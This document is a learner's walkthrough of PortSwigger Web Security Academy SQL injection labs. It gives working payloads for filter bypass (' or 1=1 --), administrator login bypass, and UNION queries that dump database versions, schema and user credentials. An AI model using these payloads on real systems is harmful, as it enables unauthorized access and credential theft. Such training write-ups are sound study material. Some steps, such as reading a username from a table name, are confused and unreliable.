https://portswigger.net/web-security/all-labs#sql-injection

# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following: 

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products. 

Step-1 : Acccess the Lab
Step-2 : When the lab page opes it shows different shopping options
Step-3 : In our question it says the hidden data with WHERE clause
Step-4 : Analysis the Where clause with changing the value on the URl
         For Example, 
```URL 
https://0a6f00a603c0f4cf80b2c17c00be00ea.web-security-academy.net/filter?category=Pets

https://0a6f00a603c0f4cf80b2c17c00be00ea.web-security-academy.net/filter?category=''

https://0a6f00a603c0f4cf80b2c17c00be00ea.web-security-academy.net/filter?category='--

https://0a6f00a603c0f4cf80b2c17c00be00ea.web-security-academy.net/filter?category='1=1--

https://0a6f00a603c0f4cf80b2c17c00be00ea.web-security-academy.net/filter?category='or 1=1 --

```

Step-5 : In this link we get some shopping options which are hidden 
```url
 https://0a6f00a603c0f4cf80b2c17c00be00ea.web-security-academy.net/filter?category='or 1=1 -- 

```
Step-6 : When we find the hidden data then our will finishes.

# Lab: SQL injection vulnerability allowing login bypass

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user. 

Step-1 : Access the lab (Same for all labs)
Step-2 : open My Account to login
Step-3 : Analysis 
         SELECT name FROM users WHERE Username='administrator' 
         
(Because in the question there ia hit "logs in to the application as the administrator user")

Password can be anything 'cause we are ignoring it..

now do the analysis based on the Username like

            Username=administrator'
            Username=administrator''
                 ..   ..   
                 ..   ..  
                 ..   ..  
                 ..   ..  
            Username=administrator'--

Step-4 : In the " Username=administrator'-- " we will the successful login.


# Lab: SQL injection attack, querying the database type and version on Oracle

 This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 

Step-1 : Access the lab 
Step-2 : Open the Burp Browser and copy the link of the lab paste it in the browser
Step-3 : On the interceptor then click on the Lifestyle on the Browser
Step-4 : Now we will the response in the Burp Suite send that to the repeator
Step-5 : In the very 1st line keep this content type this ..

```https
GET /filter?category=Lifestyle+'UNION+SELECT+BANNER,NULL+FROM+v$version-- HTTP/2
```
Then send the request and observe the chenges, there you see that the lab is solved.

# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string. 

Step-1 : Access the lab and open the BurpSuite
Step-2 : Open the lab link in Burp Browser
Step-3 : On the Intercept
Step-4 : Get the data and send to repeator
Step-5 : In the very 1st line keep this content type this ..

```https
GET /filter?category=Gifts'UNION+SELECT+@@version,+NULL# HTTP/2
```
Then send the request and observe the chenges, there you see that the lab is solved.


# Lab: SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 

Step-1 : Access the lab and open the BurpSuite
Step-2 : Open the lab link in Burp Browser
Step-3 : On the Intercept
Step-4 : Get the data and send to repeator
Step-5 : In the very 1st line keep this content type this ..

```https
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```
Step-6 : Send the request you will get the information based on the tables in the html format
Step-7 : Check for user_name in the information. Our username wiil be like " users_edupci "
         Hence, the username is " edupci "
Step-8 : Now we need to get the password. So, type..

```https
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_edupci'--
```

Step-9 : When we send the request we will get the information there we can see the new User_name and password.
            
            username_bauhrs
            password_woqpwf
Step-10 : When you got the password and the username then we need to enter the below content

```http
'+UNION+SELECT+password_woqpwf,+username_bauhrs+FROM+users_edupci--
```

Step-11 : Now send the request we will get the response. In that response we can see the password and the username to login to the account or to complete the lab
         The Username = administrator
         The password = ydjg5c79qc4t797yihrq

Step-13 : Well will successfully completed the lab.

